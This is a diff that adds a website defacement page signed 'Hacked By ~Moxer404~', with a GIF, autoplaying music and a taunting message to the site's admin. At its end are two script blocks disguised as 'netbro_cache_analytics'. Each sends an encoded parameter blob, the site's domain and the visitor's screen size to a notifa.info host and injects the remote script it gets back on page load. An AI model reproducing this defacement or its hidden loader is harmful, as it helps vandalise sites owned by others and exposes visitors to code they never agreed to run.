@@ -1,0 +1,49 @@
+
+<html>
+<head>
+<title>Ghost Hunter Illusion</title>
+<meta property="og:image" content="https://s6.gifyu.com/images/1588741034140.gif">
+<meta name="descryption" content="asw kabeh">
+<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
+</head>
+<style>
+body {
+background-color : black ;
+color : white ;
+font-family : Kelly Slab ;
+}
+.tengahken {
+position : absolute ;
+margin : auto ;
+height : 50% ;
+top : 0 ; bottom : 240 ; left : 0 ; right : 0 ;
+}
+</style>
+<center>
+<div class="tengahken">
+<img src="https://s6.gifyu.com/images/1588741034140.gif" height="100%"><br><br>
+	<audio src="https://5.top4top.net/m_15597drpe1.mp3" autoplay="" controls=""></audio></audio><br><br>
+<b><font size="5px">Hacked By ~Moxer404~ </b><br>
+<font size="10px"> Ghost Hunter Illusion <br>~
+<font size="4px"> I Am Ghost In Your System, Sorry Admin Your Site Been Hacked, Pliss Fix Your Site.. I Am Back Soon :) <font size="10px">~<br>
+<body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? 
+
+"https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K
+
+%2fc5C582JQuX3gzRncXvF2XNsCNNWd%2f%2fCb1%2f9nJCH4aCjU%2bLqqyGGCHbJMG612%2f9lcyUFZTkZ2YyyVArIL1d%2bn5Vo%2f05lyDnuzLhkFPuM4JsVK%2fyiwH6DfrCpVVDs3NAGFEtxOliO
+
+%2fXuMpNqIlJPIT0viANHadxhbEw3PsxyvJli5gwB%2bQk
+
+%2bOejOLru6k1%2fgNjXafXp2BIXIVJtmxVbftvuFHkXm1eWePjv71S97WXVfKdnZwGJIeNRtYEx6sNfL4b37h33JPDJYl7CLGZZyztOqtVX5AfeaWvD3%2fZAecKo
+
+%2fUNb7pUJRAiWG9QEdDUrgjhQj9XB8%2bGvgvOC%2ffyLbJGuOSvQ%2bBUweciLu2YbXyByp3J6IlK5LEX7pU6%2fLdp3LRAtPx6yYhdKxNwo3yhjIj
+
+%2fJRWLYZrgKr4dMONk14yQyh8JYYSwP36dwDcN2%2bZeMpZlbwkd%2bXvhuMo5%2bj6H6DG86JM%2b1HSjjk
+
+%2b7RreoH7Kc5TYRSOcdh9BbCWkZlZ9DMhS2VnEsQGgeGVE1vjCgS6gV86cbWInvWuLXZ6kc81n8A6ltOwKz61SlKUtlKjHuHdivJH6KgQbu0MD6eH1kNYO0Ye0SA4zGY2%2bp3rls1yN28%2fGd7mBZv
+
+%2biFXP8ZIATBMiyeKcTRSrg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = 
+
+true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXc8SyCxdDkVb1WPlOWzeJ%2bECoKQDfZK44JnczFmwU0jCFuZ8mkV54WqMn7Za%2fqyxv0uS8HmRn5m6HVTLyhr7VKmPD93IRQi38cJFJR0hwRjs8uDu5215rFhkUX7M8xYUoy012Ws3gKse7KYPUdq4TmxPoEhCo%2bJb3OiRtOpvmWfm3Z7RzZ7jj9px7JBU%2bG7YiQsZfIKaJcb7CX1z0YcCGUhKIzIBFcXJZF5zLr4YVcQmeFHSJSFnOo%2bbxVWAZK2Nmg4acT6fJKJJe3owU2gwr958dzoSsgQRzBMER5UkF1r%2btPRbUS1RO%2bxatUBOqDWY3gyuM5QKPWmNcfhTBpTllCU5P1n80r%2fT9waKrmquJ%2fOjcfozPaww86aBamVUabCXG8%2bG17hIzJrcz5L0APptwaodwwJFcSeSo5Ntwi1E%2bd19kBvFZDbK%2f2J81eZpI23QgoLyxCGh979dHUt7Pn%2bJPlgigpXzWimJ78aE7SWcMvIfvCVK9Qy8Gh%2fS20w9sNJcJ76v%2bnLNNnIVyRby5kXJUOWF4dfIHP5Z%2ftCENN%2bCSQqn3ZmFn6oUUqwvNgn8Zq9Z5wpR9va1mqUlX%2b680bJdR5A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
